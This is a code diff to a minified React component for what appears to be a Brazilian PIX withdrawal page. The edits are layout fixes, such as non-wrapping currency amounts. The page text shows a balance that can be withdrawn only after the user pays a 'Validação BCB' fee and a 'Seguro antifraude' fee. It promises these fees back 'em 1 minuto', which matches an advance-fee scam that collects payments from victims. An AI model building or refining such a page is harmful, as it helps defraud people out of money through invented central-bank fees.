@@ -91,8 +91,8 @@ const xe = () => {
         if (o?.amount) { setPixAmount(o.amount); }
     }, [o]);
 
-    // 🔧 Correção: Inserção de espaço não-quebrável entre o símbolo e o número
-    const n = t => `R$${'\u00A0'}${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
+    // 🔧 Formatador de moeda
+    const n = t => `R$ ${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
     const q = new Date().toLocaleDateString("pt-BR");
     const D = { cpf: "CPF", email: "E-mail", phone: "Celular", random: "Chave aleatória" };
 
@@ -148,7 +148,7 @@ const xe = () => {
                     className: "text-white/80 text-[14px]",
                     children: g ? `${g}, seu saldo` : "Saldo disponível"
                 }), e.jsx("p", {
-                    className: "text-white text-[38px] font-extrabold leading-tight tracking-tight mt-1",
+                    className: "text-white text-[38px] font-extrabold leading-tight tracking-tight mt-1 whitespace-nowrap",
                     style: { fontVariantNumeric: "tabular-nums" },
                     children: n(m)
                 }), e.jsx("p", {
@@ -212,7 +212,7 @@ const xe = () => {
                         className: "text-muted-foreground text-[12px]",
                         children: "Validação BCB"
                     }), e.jsx("span", {
-                        className: "text-foreground text-[12px] font-semibold",
+                        className: "text-foreground text-[12px] font-semibold whitespace-nowrap",
                         children: "R$ 13,40"
                     })]
                 }), e.jsxs("div", {
@@ -221,7 +221,7 @@ const xe = () => {
                         className: "text-muted-foreground text-[12px]",
                         children: "Seguro antifraude"
                     }), e.jsx("span", {
-                        className: "text-foreground text-[12px] font-semibold",
+                        className: "text-foreground text-[12px] font-semibold whitespace-nowrap",
                         children: "R$ 11,50"
                     })]
                 }), e.jsxs("div", {
@@ -230,7 +230,7 @@ const xe = () => {
                         className: "text-foreground text-[12px] font-bold",
                         children: "Total (reembolsável)"
                     }), e.jsx("span", {
-                        className: "text-[#10B981] text-[12px] font-bold",
+                        className: "text-[#10B981] text-[12px] font-bold whitespace-nowrap",
                         children: n(p)
                     })]
                 })]
@@ -250,7 +250,7 @@ const xe = () => {
                         })
                     }), e.jsxs("p", {
                         className: "text-foreground text-[10px] font-bold mt-1.5 text-center leading-tight",
-                        children: ["Pagar", e.jsx("br", {}), n(p)]
+                        children: ["Pagar", e.jsx("br", {}), e.jsx("span", { className: "whitespace-nowrap", children: n(p) })]
                     })]
                 }), e.jsx("div", {
                     className: "h-[2px] bg-[#E5E7EB] flex-1 mx-1 mt-[-16px]"
@@ -278,7 +278,7 @@ const xe = () => {
                         })
                     }), e.jsxs("p", {
                         className: "text-muted-foreground text-[10px] mt-1.5 text-center leading-tight",
-                        children: [n(m), e.jsx("br", {}), "na conta"]
+                        children: [e.jsx("span", { className: "whitespace-nowrap", children: n(m) }), e.jsx("br", {}), "na conta"]
                     })]
                 })]
             })
@@ -312,7 +312,7 @@ const xe = () => {
                     className: "text-muted-foreground text-[15px]",
                     children: "Valor a receber"
                 }), e.jsx("span", {
-                    className: "font-bold text-[15px] text-foreground",
+                    className: "font-bold text-[15px] text-foreground whitespace-nowrap",
                     children: n(m)
                 })]
             }), e.jsx("button", {
@@ -346,7 +346,7 @@ const xe = () => {
                 className: "text-muted-foreground text-[12px] text-center mb-3",
                 children: "Ou copie o código PIX abaixo:"
             }), o?.amount && e.jsx("div", {
-                className: "text-center font-extrabold text-[18px] text-pink mb-3",
+                className: "text-center font-extrabold text-[18px] text-pink mb-3 whitespace-nowrap",
                 children: "Valor: R$ " + (o.amount / 100).toFixed(2).replace(".", ",")
             }), e.jsx("div", {
                 className: "relative",
@@ -386,10 +386,10 @@ const xe = () => {
                     children: [e.jsxs("div", {
                         className: "flex items-center justify-between",
                         children: [e.jsx("span", {
-                            className: "text-foreground text-[13px] font-semibold",
+                            className: "text-foreground text-[13px] font-semibold truncate mr-2",
                             children: t.name
                         }), e.jsxs("span", {
-                            className: "text-[#10B981] text-[10px] font-bold",
+                            className: "text-[#10B981] text-[10px] font-bold whitespace-nowrap shrink-0",
                             children: [t.value, " ✓"]
                         })]
                     }), e.jsxs("p", {
@@ -431,7 +431,7 @@ const xe = () => {
                     children: N ? e.jsx(k, {
                         size: 22, className: "animate-spin"
                     }) : e.jsxs(e.Fragment, {
-                        children: [e.jsx(X, { size: 17 }), "CONFIRMAR SAQUE ", n(m)]
+                        children: [e.jsx(X, { size: 17 }), e.jsx("span", { className: "whitespace-nowrap", children: `CONFIRMAR SAQUE ${n(m)}` })]
                     })
                 }), e.jsxs("div", {
                     className: "flex items-center justify-center gap-1.5 mt-3",
@@ -439,7 +439,7 @@ const xe = () => {
                         size: 14, className: "text-[#10B981]"
                     }), e.jsxs("span", {
                         className: "text-[#10B981] text-[13px] font-semibold",
-                        children: ["Reembolso de ", n(p), " em 1 minuto"]
+                        children: ["Reembolso de ", e.jsx("span", { className: "whitespace-nowrap", children: n(p) }), " em 1 minuto"]
                     })]
                 })]
             })
